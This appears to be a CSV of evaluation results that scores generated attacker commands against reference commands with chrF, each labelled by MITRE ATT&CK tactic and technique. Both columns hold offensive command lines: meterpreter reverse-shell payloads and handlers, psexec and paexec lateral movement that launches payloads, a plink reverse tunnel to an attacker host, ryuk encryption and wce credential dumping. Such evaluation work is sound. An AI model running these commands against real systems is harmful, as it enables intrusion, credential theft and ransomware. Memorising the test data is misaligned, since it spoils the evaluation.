file,tool,input_command,matched_command,chrf_score,match_found
command_metasploit_TA0002_T1203.txt,metasploit,set RHOST <target_machine_IP>,`msfvenom -p python/meterpreter/reverse_https LHOST=<attacker IP> LPORT=8443 -o python.py`,17.256,True
command_metasploit_TA0002_T1203.txt,metasploit,set PAYLOAD windows/meterpreter/reverse_tcp,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,56.249,True
command_metasploit_TA0002_T1203.txt,metasploit,exploit,"    ```
    set CMD ""reg.exe IMPORT C:\Users\Public\vnc-settings.reg""
    exploit
    ```",27.403,True
command_paexec_TA0011_T1219.txt,paexec,paeexec.exe -s -i -u <user_name> -p <password> -c \\\\remote_system," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",29.269,True
command_paexec_TA0011_T1219.txt,paexec,paeexec.exe -c \\\\remote_system -n <timeout_seconds> -p <password> -v," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",27.048,True
command_paexec_TA0011_T1219.txt,paexec,paeexec.exe -s -i -l -u <user_name> -w <remote_directory>," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",21.045,True
command_paexec_TA0011_T1219.txt,paexec,paeexec.exe -s -i -h -c \\\\remote_system," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",21.8,True
command_plink_TA0008_T1021.txt,plink,plink.exe -no-antispoof -R 3389:localhost:3389 <victim_machine_ip>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",43.232,True
command_psexec_TA0003_T1133.txt,psexec,psexec \\remote_system -u <username> -p <password> -r <service_name>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",24.544,True
command_psexec_TA0003_T1133.txt,psexec,psexec \\remote_system -s -r <service_name>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",17.808,True
command_psexec_TA0003_T1133.txt,psexec,psexec \\remote_system -h -r <service_name>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",17.808,True
command_psexec_TA0011_T1105.txt,psexec,"psexec \\<target_computer> -s -n 30 -u <attacker_username> -p <attacker_password> cmd /c ""bitsadmin /transfer getfile /download /file C:\path\to\target_file.exe""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",21.316,True
command_psexec_TA0011_T1105.txt,psexec,psexec \\<target_computer> -s -l -n 30 -u <attacker_username> -p <attacker_password> powershell -ExecutionPolicy Bypass -File C:\path\to\powershell_script.ps1,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",21.089,True
command_psexec_TA0011_T1105.txt,psexec,"psexec \\<target_computer> -s -h -n 30 -u <attacker_username> -p <attacker_password> cmd /c ""copy C:\path\to\target_file.exe %appdata%\Microsoft\Windows\Downloaded Program Files""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",22.667,True
command_ryuk_TA0009_T1113.txt,ryuk,ryuk.exe --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,36.908,True
command_ryuk_TA0009_T1113.txt,ryuk,ryuk.exe -e,`ryuk.exe --encrypt --process-name notepad.exe`,47.11,True
command_windows_credential_editor_TA0009_T1005.txt,windows credential editor,wce.exe /dump /ntlm,"```sh
wce.exe -w
```",30.054,True
